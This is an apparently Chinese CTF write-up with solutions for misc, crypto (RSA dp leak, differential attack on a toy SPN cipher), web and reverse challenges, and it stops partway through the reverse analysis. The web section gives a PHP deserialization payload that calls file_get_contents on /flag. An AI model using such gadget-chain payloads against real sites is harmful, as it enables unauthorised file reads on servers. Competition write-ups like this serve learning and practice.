# vapev4\.11crack

# misc

## 签到

ZmxhZ3tmYjI0MzAyNS1kMjA0LTRlZGEtYjNkYy01MGZlZmExMDg5ZmR9用base64解码

```Assembly language
flag{fb243025-d204-4eda-b3dc-50fefa1089fd}
```

## Data

file \./data

查看类型\./data: QEMU QCOW Image \(v3\), 10737418240 bytes \(v3\), 10737418240 bytes

是 QEMU 虚拟机的磁盘存储格式，用于保存虚拟机的磁盘数据。要查看其内部内容

这样的话需要挂载

命令如下：

```Python
modprobe nbd max_part=8
qemu-nbd --connect=/dev/nbd0 data
fdisk -l /dev/nbd0
mkdir /mnt/qcow
mount /dev/nbd0p2 /mnt/qcow
cd /mnt/qcow
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGQ3ZjdlNDdhYmE4OTM2ODEwYzU2MzIwMjI4N2ViODhfMTZkOGVjNWQ1NGZiMjUwYTliOWUwOGE5MDM1YWM4N2JfSUQ6NzU4ODQ4MzQzMTkxNTM3NTU4MF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

发现项目启动\-项目计划是zip文件

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OWMxYTgyOTZmMGVkNzQ5MWQ3OWE1OWQ3ZGU3YTliOGRfZTI0ZTk5YjdmMmVmM2RhY2YwYzUyYWRhOTJkZDM0NWNfSUQ6NzU4ODQ4MzU2OTY0MzkxNjUwN18xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

解压发现一堆二维码

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjhmZTczY2MzOWM5ODU0YjY3ZWEzNjViYzk1MTYxMThfN2YwNDIxNzBmMThhMzRhYzQ1NzY3NzAyM2FiNDg1MzhfSUQ6NzU4ODQ4NDYxMDI1NDc4NTc1N18xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

按时间递增排序发现有一些规律，尝试拼好二维码，拼了前三张都不对，两张“你拼错了”，一张base64编码还是“你拼错了”，最后一张：

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MjgxODk4YmU3ODk5MzkzOWE0MDgzYjdhYjQ3Y2ZmZDNfYmJmMGI1NmQ4ZDA0NDQ5NWNhZTFkNzBmMDJiYjU2ZjRfSUQ6NzU4ODQ4NDM1ODQ1ODIxNTM3OV8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

扫描：

K5LGIS2TGBIXSVKEJJKVCVJRJBKGW4CZKNDFUSKUIVTTAUSWIJFFC2SWKZLFKWTBK5LGIWSVGFUFKVTKJF4VO3DIIZLFMULZKIYGG6KRKVCXSVLKLJDFKVSGIRLDCVSKKZDHAUCTKZSEUV2GJZMU4222IJLEMZCTKMYFUS2XKVDFOVCVOBFFE2S2JBKWYVSTKBKDAOKQKQYDS===

解码，得到：

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzE0MWRhYzVhY2QxMjE0M2JlMmY3ZDkyZmM3YjRjZDVfMDBmM2Y3N2Q1Mzk0ZjY2NWFmMTdiZDQ5ZjRhMzk4MmFfSUQ6NzU4ODQ4NDc0MDgyMzQwMzczOF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

```Python
flag{4a154507-ba7d-3f79-8739-91533b2bafc7}
```

# crypto

## RSA

rsa还有dp，在网上找脚本https://blog\.csdn\.net/weixin\_45859850/article/details/109559190

有dp = d%\(p\-1\)

dp ≡ d mod \(p−1\)⇒ dp × e ≡ d × e mod \(p−1\)⇒ d × e = k × \(p−1\) \+ dp × e

然后是 “变形后的公式与下式结合”，接着公式：d × e ≡ 1 mod φ\(n\)

然后 “因为:”，公式：φ\(n\) = \(p−1\) × \(q−1\)

“所以我们可以进行变形:”⇒ d × e ≡ 1 mod \(p−1\) × \(q−1\)

“得到:”k × \(p−1\) \+ dp × e = 1 mod φ\(n\)

“再次变形:”k₁ × \(p−1\) \+ dp × e = 1 mod \(p−1\) × \(q−1\)

“结合:”k₁ × \(p−1\) \+ dp × e = k₂ × \(p−1\) × \(q−1\) \+ 1⇒ dp × e = \[k₂ × \(p−1\) × \(q−1\) \+ 1\] − \[k₁ × \(p−1\)\]⇒ dp × e = \[k₂ × \(q−1\) − k₁\] × \(p−1\) \+ 1

“设: X = k₂ × \(q−1\) − k₁”⇒ dp × e = X × \(p−1\) \+ 1⇒ dp \< p − 1⇒ X \< e⇒ X ∈ \(0,e\)

```Python
import gmpy2 as gp

n = 93977446509601491411273109183700477792476081212252100588514513996369916050240513858257713585313335366590846240370949831289684059273587772970292476296340120801189466605373324380976699533407970974215875662294283755613133719192114163547130089995306718768119144501566575807133141973499886356493323821201111393199
e = 65537
dp = 4646721143214293575763413674967142339122604220191663048739174575126624610789286103728040064106260338484738571999187838033377907298506299277252376843468857
c = 39842044108169653665655273759299059319749157454557086299529162182474598233474908300467494642550719706800866015430966154461050042032159169236220832726422011654867871818265524075008160875598938671421298968459869843510325230871429349578969045129760472874539862070944657591218420952191065002303403538259250208430

for i in range(1,e):                   
    if(dp*e-1)%i == 0:
        if n%(((dp*e-1)//i)+1) == 0:   
            p=((dp*e-1)//i)+1
            q=n//(((dp*e-1)//i)+1)
            phi=(q-1)*(p-1)            
            d=gp.invert(e,phi)         
            m=pow(c,d,n)               
           
print(m)                              
print(bytes.fromhex(hex(m)[2:]))      

```

```Assembly language
flag{L34k_0f_Dp_Br34ks_RS4_E4sy}
```

## CathylinFour\+\+

这道题是一个16位的SPN分组密码（CathylinFour\+\+），轮数为3轮。我们需要恢复最后一轮子密钥K3（即`key[3]`），并通过提交`K3 ^ mask`来获取flag。攻击的核心思路是差分密码分析，具体步骤如下：

1. 理解密码结构：

    - 16位分组，3轮加密。

    - 每轮包含：异或轮密钥、异或轮常数、S盒层、P层置换（最后一轮无P层）。

    - S盒是4位到4位的双射。

    - P层是16比特的固定置换。

    - 最后一轮：S盒后直接异或K3输出密文。

2. 攻击目标：

    - 恢复K3（16位），它被分成4个4位部分（K3\_0, K3\_1, K3\_2, K3\_3），对应4个S盒。

3. 差分攻击原理：

    - 选择固定明文差分α = 0x1111（每个4位部分差分1）。

    - 生成2048对明文（4096次查询，达到上限）。

    - 加密后，密文差分δ\_c = c1 ⊕ c2。

    - 关键观察：当δ\_c中恰好一个4位部分非零时，意味着第三轮S盒输入差分中，只有一个S盒有非零输入差分（其他三个S盒输入差分=0）。这是因为S盒是双射，输入差分0当且仅当输出差分0。

4. 密钥恢复：

    - 将2048对密文按δ\_c的非零位置分组（4组，每组对应一个S盒）。

    - 对每组，猜测对应4位密钥k：

        - 计算S盒输入：u1 = S⁻¹\(y1 ⊕ k\), u2 = S⁻¹\(y2 ⊕ k\)

        - 计算输入差分候选：d = u1 ⊕ u2

    - 正确密钥特征：所有对计算出的d应相同（因为明文差分固定，真实输入差分固定）。

    - 统计每个k对应的d的频率分布，选择最大频率值最大的k作为正确密钥（正确密钥下，所有d相同，频率=组大小）。

5. 提交验证：

    - 组合4个4位部分得到K3。

    - 计算proof = K3 ⊕ mask，提交获取flag。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDRhNzhiY2FlMDU5MWJlNDk3NzVhNWQwZTY4NThhOTJfMzhlYzExZGNjN2E2ODhlNTY1YTgyYWRmMzAzOGM0OTFfSUQ6NzU4ODQzODAzNDIyMDI4ODk5Ml8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

```Python
#!/usr/bin/env python3
import socket
import re
import random
import time
import sys
import errno

def init_sbox():
    """初始化S盒及逆S盒（题目指定固定S盒）"""
    s_box = [0xC, 0x5, 0x6, 0xB, 0x9, 0x0, 0xA, 0xD, 0x3, 0xE, 0xF, 0x8, 0x4, 0x7, 0x1, 0x2]
    s_box_inv = [0] * 16
    for idx, val in enumerate(s_box):
        s_box_inv[val] = idx
    return s_box, s_box_inv

def extract_nibble(value, nib_idx):
    """提取16位整数指定位置的4位段（半字节）
    nib_idx: 0=最高位(MSB), 1=次高位, 2=次低位, 3=最低位(LSB)
    """
    shift_bits = 12 - 4 * nib_idx
    return (value >> shift_bits) & 0xF

def parse_server_mask(banner_data):
    """从服务器返回的Banner中解析mask值"""
    mask_pattern = re.compile(r"mask = 0x([0-9a-fA-F]{4})")  # 限定4位十六进制
    match_result = mask_pattern.search(banner_data)
    if not match_result:
        return None
    return int(match_result.group(1), 16)

def generate_diff_queries(diff_features, pair_count):
    """生成差分攻击所需的明文查询对
    diff_features: 差分特征列表 [(输入差分alpha, 输出差分beta), ...]
    pair_count: 每个差分特征生成的明文对数量
    """
    query_list = []
    for alpha, beta in diff_features:
        for _ in range(pair_count):
            plain1 = random.getrandbits(16)  # 随机16位明文
            plain2 = plain1 ^ alpha          # 生成差分明文对
            query_list.append(f"0x{plain1:04x}")
            query_list.append(f"0x{plain2:04x}")
    return query_list

def parse_ciphertext(buffer_data):
    """解析服务器返回的密文（提取Output后的十六进制值）"""
    cipher_list = []
    # 用正则匹配"Output: 0xXXXX"格式的行
    cipher_pattern = re.compile(r"Output: 0x([0-9a-fA-F]{4})")
    # 按行分割并过滤空行
    lines = [line.strip() for line in buffer_data.decode(errors='ignore').split('\n') if line.strip()]
    for line in lines:
        match = cipher_pattern.search(line)
        if match:
            try:
                cipher_val = int(match.group(1), 16) & 0xFFFF  # 确保16位
                cipher_list.append(cipher_val)
            except ValueError:
                continue
    return cipher_list

def recover_k3(s_box_inv, diff_features, cipher_list, pair_count):
    """通过差分投票恢复轮密钥K3
    返回值：恢复的16位K3密钥
    """
    # 初始化投票矩阵：4个半字节 × 16种可能的密钥值
    key_votes = [[0] * 16 for _ in range(4)]
    cipher_idx = 0

    for alpha, beta in diff_features:
        # 确定当前差分特征的活跃/非活跃半字节索引
        active_nibs = [i for i in range(4) if extract_nibble(beta, i) != 0]
        inactive_nibs = [i for i in range(4) if extract_nibble(beta, i) == 0]

        # 遍历当前差分特征对应的所有明文对
        for _ in range(pair_count):
            if cipher_idx + 1 >= len(cipher_list):
                break
            # 取一对密文
            cipher1 = cipher_list[cipher_idx]
            cipher2 = cipher_list[cipher_idx + 1]
            cipher_idx += 2

            # 计算密文差分
            cipher_diff = cipher1 ^ cipher2

            # 过滤无效对：非活跃半字节的差分必须为0
            is_valid_pair = True
            for nib_idx in inactive_nibs:
                if extract_nibble(cipher_diff, nib_idx) != 0:
                    is_valid_pair = False
                    break
            if not is_valid_pair:
                continue

            # 对活跃半字节进行密钥投票
            for nib_idx in active_nibs:
                beta_nib = extract_nibble(beta, nib_idx)
                c1_nib = extract_nibble(cipher1, nib_idx)
                c2_nib = extract_nibble(cipher2, nib_idx)

                # 遍历所有可能的4位密钥值（0~15）
                for key_guess in range(16):
                    # 逆S盒解密：S(u) = c ^ k → u = S_inv[c ^ k]
                    u1 = s_box_inv[c1_nib ^ key_guess]
                    u2 = s_box_inv[c2_nib ^ key_guess]
                    # 验证输入差分是否匹配预期beta
                    if (u1 ^ u2) == beta_nib:
                        key_votes[nib_idx][key_guess] += 1

    # 从投票结果拼接K3密钥
    k3 = 0
    print("[*] 各半字节密钥投票结果：")
    for nib_idx in range(4):
        max_vote = max(key_votes[nib_idx])
        best_key = key_votes[nib_idx].index(max_vote)
        print(f"    半字节{nib_idx}: 密钥0x{best_key:01x} (得票{max_vote})")
        k3 |= (best_key << (12 - 4 * nib_idx))  # 拼接4个半字节
    return k3

def main():
    # 服务器配置
    SERVER_HOST = "123.57.26.77"
    SERVER_PORT = 30467
    # 差分特征（输入差分→第一轮输出差分）- 题目核心特征
    DIFF_FEATURES = [
        (0x7000, 0x0210),
        (0x9000, 0x1040),
        (0xD000, 0x0104),
        (0x0700, 0x8001)
    ]
    PAIR_PER_FEATURE = 400  # 每个差分特征生成400对明文

    # 初始化S盒
    s_box, s_box_inv = init_sbox()

    # 1. 建立网络连接
    try:
        # 配置socket超时（避免永久阻塞）
        client_socket = socket.create_connection((SERVER_HOST, SERVER_PORT), timeout=30)
    except socket.timeout:
        print("[-] 连接服务器超时")
        return
    except Exception as e:
        print(f"[-] 连接服务器失败: {str(e)}")
        return

    # 2. 接收并解析服务器Banner和mask
    banner_buffer = b""
    try:
        while True:
            recv_data = client_socket.recv(4096)
            if not recv_data:
                print("[-] 服务器提前关闭连接")
                client_socket.close()
                return
            banner_buffer += recv_data
            # 确认收到目标信息
            if b"Goal: submit" in banner_buffer and b"mask =" in banner_buffer:
                break
    except socket.timeout:
        print("[-] 接收Banner超时")
        client_socket.close()
        return

    banner_text = banner_buffer.decode(errors='ignore')
    print("[*] 成功连接到目标服务器")
    print(f"[*] 服务器Banner:\n{banner_text}")

    # 解析mask
    mask = parse_server_mask(banner_text)
    if mask is None:
        print("[-] 未能从Banner中解析到mask值")
        client_socket.close()
        return
    print(f"[*] 解析到mask值: 0x{mask:04x}")

    # 3. 生成差分查询对并发送
    query_list = generate_diff_queries(DIFF_FEATURES, PAIR_PER_FEATURE)
    query_payload = "\n".join(query_list) + "\n"
    print(f"[*] 生成{len(query_list)}个查询指令（{len(DIFF_FEATURES)*PAIR_PER_FEATURE}对明文）")

    # 清理socket缓冲区残留数据
    client_socket.setblocking(False)
    try:
        while True:
            try:
                leftover = client_socket.recv(4096)
                if not leftover:
                    break
            except BlockingIOError:
                break
            except socket.error as e:
                if e.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                    break
    except Exception:
        pass
    client_socket.setblocking(True)

    # 发送查询指令
    try:
        client_socket.sendall(query_payload.encode())
        print("[*] 已发送所有查询指令")
    except Exception as e:
        print(f"[-] 发送查询指令失败: {str(e)}")
        client_socket.close()
        return

    # 4. 接收并解析密文
    cipher_buffer = b""
    expected_cipher_count = len(query_list)
    cipher_list = []
    print(f"[*] 开始接收密文（预期{expected_cipher_count}个）")

    try:
        while len(cipher_list) < expected_cipher_count:
            recv_data = client_socket.recv(4096)
            if not recv_data:
                break
            cipher_buffer += recv_data
            # 解析当前缓冲区中的密文
            parsed_ciphers = parse_ciphertext(cipher_buffer)
            # 去重并补充到列表（避免重复解析）
            new_ciphers = [c for c in parsed_ciphers if len(cipher_list) < expected_cipher_count and c not in cipher_list]
            cipher_list.extend(new_ciphers)
            # 截断已解析的缓冲区（优化内存）
            if b"Output: " in cipher_buffer:
                last_output = cipher_buffer.rfind(b"Output: ")
                cipher_buffer = cipher_buffer[last_output:]
    except socket.timeout:
        print("[-] 接收密文超时")
    except Exception as e:
        print(f"[-] 接收密文异常: {str(e)}")

    print(f"[*] 最终接收密文数量: {len(cipher_list)} (预期{expected_cipher_count})")
    if len(cipher_list) < expected_cipher_count:
        print("[-] 密文数量不足，攻击可能失败")
        client_socket.close()
        return

    # 5. 恢复K3密钥
    recovered_k3 = recover_k3(s_box_inv, DIFF_FEATURES, cipher_list, PAIR_PER_FEATURE)
    print(f"[*] 恢复的轮密钥K3: 0x{recovered_k3:04x}")

    # 6. 计算proof并提交
    proof = recovered_k3 ^ mask
    print(f"[*] 计算proof = K3 ^ mask = 0x{proof:04x}")

    # 提交proof
    try:
        # 发送提交指令
        client_socket.sendall(b"k\n")
        time.sleep(0.3)  # 等待服务器响应
        # 发送proof值
        client_socket.sendall(f"0x{proof:04x}\n".encode())
        print("[*] 已提交proof值，等待服务器响应...")
    except Exception as e:
        print(f"[-] 提交proof失败: {str(e)}")
        client_socket.close()
        return

    # 7. 接收flag
    flag_buffer = b""
    try:
        while True:
            recv_data = client_socket.recv(4096)
            if not recv_data:
                break
            flag_buffer += recv_data
            # 检测到flag或结束标识则停止
            if b"flag" in flag_buffer or b"Bye" in flag_buffer or b"bye" in flag_buffer:
                break
    except socket.timeout:
        print("[-] 接收flag超时")

    # 输出最终结果
    print("\n[+] 服务器最终响应:")
    print(flag_buffer.decode(errors='ignore'))

    # 关闭连接
    client_socket.close()
    print("[*] 连接已关闭，脚本执行完成")

if __name__ == "__main__":
    # 设置随机数种子（可选，便于复现）
    random.seed(int(time.time()))
    main()
```



```Assembly language
ZmxhZ3swZDI5NzEyNi1mYTY2LTQ0MjUtYjkxZC1iMTYxYWRjNDM1NzR9
```

## classic

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjdkNzU3NmExZGY3YjBkMjgyMDYyNTI1YjdjNTg1NjBfYTU3ZjEwYjY5NTMzMDMxODY0ZDZlNzI2YTZiMGQ2ZWZfSUQ6NzU4ODQwODA5MDgwMzAzMDk4N18xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

用随波逐流信息安全网\-\-图形密码http://www\.1o1o\.xyz/code\_tabel/imgcode\.html\#2

```Assembly language
flag{c1assicalcrypt03asy}
```

## Quantum

在密码学攻击中，"oracle"指一个能执行特定操作\(如解密\)的黑盒，但不会直接泄露密钥。oracle\_transcript\.txt文件记录了与这个解密预言机的交互过程。这是一个选择密文攻击\(CCA\)或Padding Oracle攻击的完整记录。攻击者通过多轮查询，逐步缩小可能的明文范围。

打开oracle\_transcript\.txt，找到最后一行代表搜索完成的结果

666c61677b37613934666171652d653061332d317166302d383532372d3330303530353735363132642d39383366383564392d653061332d313166302d38386363be，

以十六进制转化成ASCII,网站https://coding\.tools/cn/hex\-to\-ascii

```Assembly language
flag{7a94faqe-e0a3-1qf0-8527-30050575612d-983f85d9-e0a3-11f0-88cc¾
```

发现flag格式不对，正常是flag\{\}，flag\{7a94faqe\-e0a3\-1qf0\-8527\-30050575612d\-983f85d9\-e0a3\-11f0\-88cc\}发现答案不对，从最后错误的格式开始暴力破解从a到z破解,发现最后一个c改成a答案正确

```Assembly language
flag{7a94faqe-e0a3-1qf0-8527-30050575612d-983f85d9-e0a3-11f0-88ca}
```

# web

### Van you see

使用脚本猫

在网上找到一个可以直接通关的脚本，在脚本第13行中修改成自己题目的网址，运行脚本通关解题，得到flag

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MjFhNjY2OTVhY2RhY2QxMTExY2IwOTRjNjM4M2IxODFfM2E1NWRkODg5YTM3NDZkMTIzMTRlOTAzOTJiZTljNzRfSUQ6NzU4ODQ0OTM2MDI1MDQ3MzY2OF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MjQ4NDY4MGRiMzcyYjA5Y2ZkZTVmNjQwYzgyNWUwZjJfOTMxZDUwMzAwYzdkZmQxODFiZDE3ZTA4OWRmNDI3ZGJfSUQ6NzU4ODQ0OTgyMjczOTU0OTM4NV8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

#### 

```Plain Text
flag{a46b8026-74e3-48cd-810f-212da8f6596a}
```

### Shroud

根据题目猜测是php反序列化漏洞

可以先写一个php脚本进行base64编码

```Bash
<?php
class Test {
    public $msg = "Hello";
}
$obj = new Test();
echo serialize($obj);
// 输出：O:4:"Test":1:{s:3:"msg";s:5:"Hello";}
?>
```

构造URL，页面返回空白说明是反序列化出错

猜测服务器存在类 APP Message Processor

尝试构造PHP脚本，可以用AI调整

```Plain Text
<?php
class Processor {
    public $callback;
    public $dummy = null;
    
    public function __construct($cb) {
        $this->callback = $cb;
    }
}

class Message {
    public $text;
    public $handler;
    
    public function __construct($text, $handler) {
        $this->text = $text;
        $this->handler = $handler;
    }
}

class App {
    public $output;
    
    public function __construct($out) {
        $this->output = $out;
    }
}

$processor = new Processor("file_get_contents");
$message = new Message("/flag", $processor);
$app = new App($message);

$serialized = 'O:3:"App":1:{s:6:"output";O:7:"Message":2:{s:4:"text";s:5:"/flag";s:7:"handler";O:9:"Processor":2:{s:8:"callback";s:17:"file_get_contents";}}}';

echo "序列化字符串:\n";
echo $serialized . "\n\n";
echo "Base64编码:\n";
echo base64_encode($serialized);
?>
```

得到

```Plain Text
TzozOiJBcHAiOjE6e3M6Njoib3V0cHV0IjtPOjc6Ik1lc3NhZ2UiOjI6e3M6NDoidGV4dCI7czo1OiIvZmxhZyI7czo3OiJoYW5kbGVyIjtPOjk6IlByb2Nlc3NvciI6Mjp7czo4OiJjYWxsYmFjayI7czoxNzoiZmlsZV9nZXRfY29udGVudHMiO319fQ==
```

构造URL，得到flag

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjQwY2JhYWU5ZjZmNzZhOWYwNTQ2NDRhMzBlNzA0MzdfMGYxYmMwNjJhZTE1ZmNmNzNkMmJmYTRlMzg2ZWVmYzJfSUQ6NzU4ODQ3MDA5MTQyMDA0NDIzMV8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)



```Plain Text
flag{3069c10e-7091-4366-90d4-dca554e807ee}
```

# reverse

## purgatory

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTBhMGE3Nzg0ZTc5MmRkZjAwOTQ5OTQ1M2Y4ZTgzYmZfY2FmY2MxMDcyMmE2ZTRhODU2NzQzYmUyOTFjMmJmYTNfSUQ6NzU4ODQxNDIwOTA1MTE1MTI5Ml8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

进main函数，先读入256字节到数组s，

取输入数组s的第v3个字符（转为无符号字节），v6记录当前有效索引，最终作为有效长度，后遇到截断条件：字符ASCII值 ≤ 0x0D（0xDu即13，对应\\r等控制字符）且 \_bittest64\(\&v4, v5\)为0，已经遍历完输入的 256 个字符，**没有遇到任何非法字符**（≤0x0D 且满足 `_bittest64` 条件的字符）；此时执行 `v6 = 256`（有效长度设为 256），循环终止。derive\_vm\_seed\(\)是生成 VM 的核心种子，位运算生成v8，选择两套等价的校验函数

`check_len_impl/alt_impl` 均要求`v6==79`，`run_and_verify_impl/alt_impl` 均要求 VM 校验值`==1597676402`。调用`prepare_flag_impl`生成 79 字节基准数据`flag_buf`；最后长度校验：`v9`函数判断`v6==79`和**VM 校验**：将用户输入与`flag_buf`送入 VM 执行校验，若 VM 最终累积变量等于固定值`0x5F3A9B72`，输出 “yes”（Flag 正确）。

环境种子计算进入derive\_vm\_seed\(\)

分析先基于固定数据构造 VM 指令元数据 → 转换为 VM 中间指令（IR）→ 结合固定数组（`seg_rk_0`/`rc4_blob`）通过循环左移、异或、加法等运算生成最终种子，供后续校验逻辑使用

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MzExOTY3YmNkNGVjMzg4ODk5YmM3NmU5YjhjZGIyYTlfOWEzM2ZmYmVhNjk0YmQ2YWNhNWFmMzA0MzFhMGZkYzJfSUQ6NzU4ODQyMzI0NDIxOTMzNzkxOV8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

初始变量赋值，构造 30 字节的`v24`数组，初始值`v1=-38^0x5A=0xDA^0x5A=0x8E`，后续每次取`unk_313D`递减的值（0xDB→0xDA→…→0x90）异或 0x5A 写入`v24`，然后构建 VM 指令元数据，其中两个函数将「原始元数据（v24 数组）」加工为「标准化的 VM 中间指令（IR）」，为后续种子计算提供合规的指令输入。build\_program\_from\_meta\_con函数

1. 初始化：准备遍历原始 30 字节元数据、写入合规数据的位置；

2. 遍历清洗：逐字节检查原始数据，只保留 0x80/0x81/0x82 标记的字节，校验长度不超 32；

3. 结束校验：最后字节必须是 0x8F（结束标记），非法则失败；

4. 输出：返回合规数据的有效长度，成功则返回 1。

translate\_to\_mid\_ir\_constprop\_0 核心步骤

1. 初始化：读取合规数据首字节作为指令码，准备计数 / 遍历；

2. 指令转换：把合规数据逐字节转为 3 字节 / 条的 VM 指令（指令码 \+ 参数 \+ 标记），带参数指令（32/112）填充参数和标记；

3. 边界校验：指令数不超 32、长度不超限，否则失败；

4. 输出：返回 VM 指令的有效条数，成功则返回 1。

然后计算参数初始化，将 v22 中的 28 条 IR 指令完整复制到 v23 缓冲区；初始化种子计算的核心参数：种子初始值（826366246）、循环计数器（0）、累加偏移量（0）、初始扰动值（122 来自 seg\_rk\_0，\-13 来自 rc4\_blob）。再核心循环计算（28 轮）逐轮结合 IR 指令、固定数组（seg\_rk\_0/rc4\_blob）计算种子：每轮取 v23 中当前 IR 指令字节与计数器异或（若指令带参数则额外异或参数）；将结果与扰动值异或后乘以 257，加上累加偏移量得到临时值；种子值异或临时值后做 32 位循环左移 7 位，更新种子；每轮更新计数器、累加偏移量（\+13）、扰动值（取自 seg\_rk\_0/rc4\_blob 下一字节），直到完成 28 轮计算。

输出最终生成的 32 位 VM 核心种子v4。

从IDA提取的数据

```Assembly language
unk_313D = 0xDB
seg_rk_0 = [0x7A, 0x9C, 0x23, 0x51, 0xB4, 0x6F, 0xD8, 0x02, 0x39, 0xE1, 0x47, 0xAC, 0x15, 0x8B, 0xD2, 0x60]
rc4_blob = [0xF3,0x8A,0x21,0xC4,0x5B,0x19,0x7E,0xD2,0x34,0x8F,0xA1,0x6C,0x92,0x0D,0x73,0xE8,0x1A,0xB5,0x4C,0xF7,0x2E,0x89,0xD0,0x3B,0x65,0x9C,0x07,0xFA,0x41,0xAE,0x18,0xD3]
sbox_1 = [0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76, ..., 0xBB,0x16] #完整256字节AES S盒
```

`run_and_verify_impl`函数分析

顶层校验函数，触发 VM 执行并最终判断结果是否符合目标值

读取栈保护 Cookie（`v5 = __readfsqword(0x28u)`），初始化局部变量 `v4 = 0`（`v4` 是 VM 执行后的输出结果，后续会被下层函数赋值）。调用下层 VM 执行函数：调用 `run_vm_constprop_0(a1, a2, a3, &v4)`，参数说明：`a1/a2/a3`：传递给 VM 的核心参数（大概率是 VM 指令地址、种子 / 控制参数、输入数据地址）；`&v4`：让 `run_vm_constprop_0` 将 VM 执行的最终结果写入 `v4`。结果判断与返回：

若 `run_vm_constprop_0` 返回值非 0（表示 VM 执行成功）：返回 `v4 == 1597676402` 的布尔值（1 = 结果符合目标值，0 = 不符合）；若 `run_vm_constprop_0` 返回值为 0（表示 VM 执行失败）：直接返回该失败结果（0）。

其中run\_vm\_constprop\_0 函数：根据 a2 的第 0 位（最低位）分支调用扰动函数，**根据 a2 的第 1 位判断是否二次调用扰动函数**：若 `a2 & 2 == 0`（第 1 位为 0）：直接跳转到 `LABEL_3`（跳过二次调用）；若 `a2 & 2 != 0`（第 1 位为 1）：再次调用 `run_vm_noise_constprop_0(a1, a2)`，取返回值与 `v6` 按位与，结果赋值给 `v6` 的低 32 位，**触发核心 VM 指令执行**：跳转到 `LABEL_3` 后，调用核心 VM 执行函数 `run_vm_inner(a1, a2, a3, a4)`：`run_vm_inner` 是真正执行 VM 指令的函数（解析之前生成的 IR 指令、结合种子运算），最终将结果写入 `a4` 指向的地址（即 `run_and_verify_impl` 中的 `v4`）；若 `run_vm_inner` 返回值为 0（执行失败）：将 `v6` 置 0（标记 VM 执行失败）。然后返回 `v6` 的低 32 位

VM 核心指令解析（基于run\_ir函数）

程序的 VM 包含 11 条指令，通过build\_program\_from\_meta\_constprop\_0/translate\_to\_mid\_ir\_constprop\_0从元数据转换为 3 字节 / 条的 IR 指令，核心指令及逻辑如下：

Opcode        助记名        操作数        行为说明        关键作用

0x01        RESET        —        \*acc=0; counter=79; idx=0        初始化 VM 状态（仅执行一次）

0x10        LOAD\_IN        —        v7 = input\[idx\]        读取用户输入第idx字节

0x11        LOAD\_TBL        —        v9 = flag\_buf\[idx\]        读取基准数据第idx字节

0x20        XOR\_IMM        imm        v7 ^= imm（imm 为指令第 2 字节）        对输入字节做固定异或混淆

0x30        ADD\_AFFINE        —        t=3\*idx\+11; v7\+=t; v9\+=t        对输入 / 基准数据做同步扰动

0x40        MIX\_ACC        —        acc ^= \(uint16\)idx \+ 131\*v7        累积校验值（影响最终结果）

0x50        CMP        —        if\(v7\!=v9\) return 0        核心校验：输入与基准数据必须相等

0x60        IDX\_STEP        —        idx = \(idx \+ 7\) % 79        输入索引按步长 7 循环（覆盖 0\-78）

0x61        DEC\_CNT        —        \-\-counter        递减循环计数器

0x70        JNZ        imm        if\(counter\!=0\) ip=\(int8\)imm        计数器非 0 时跳转，形成循环

0xFF        RET\_OK        —        return 1        VM 执行成功（校验通过）

基准数据`flag_buf`构造还原

`flag_buf`是 VM 校验的基准，需通过模拟`prepare_flag_impl`逆向还原：

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=N2I2NWRhODYwMzc4MDU1MmQ5Mzg3MjcwNTg5YmM0ODlfYzg0ZmNlY2ExOGJjN2YyMDMxNjI1NzNmYzI0NWRiN2JfSUQ6NzU4ODQzMjI4MDc5NzAyMzE2Ml8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

1：内存初始化

按小端序填充 79 字节初始缓冲区：

- 前 64 字节：填充`xmmword_31C0`、`xmmword_31D0`等 XMM 常量（从程序`.rodata`段提取）；

- 64\-78 字节：填充固定数值（如`0x7F9E9295CE4E4791`、`0x70E8CBC7`等）。

2：三阶段 Unwrap（基于种子）

根据`(seed ^ 0x4F) & 3`的结果（本题为`2`），按序执行`st1→st2→st3`：

- **st1**：用种子派生掩码对缓冲区做逐字节异或；

- **st2**：结合`seg_rk_0`数组做加法扰动；

- **st3**：用`rc4_blob`数组做复合异或混淆。

3：密钥派生与变异 RC4 解密

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTI4YzljNTI5NzQwYWIwNGVlMGI2OGFhNDcxNWVlNmFfMWVkZjkxNGE0ZTk4ODk5ZmYzZDVhMDEwZGI4MTVhZTFfSUQ6NzU4ODQzMjM3MzM0NTkxMzc5OF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

1. **密钥派生**：基于`enc_program`数组生成 8 字节 RC4 密钥；

2. **变异 RC4 解密**：

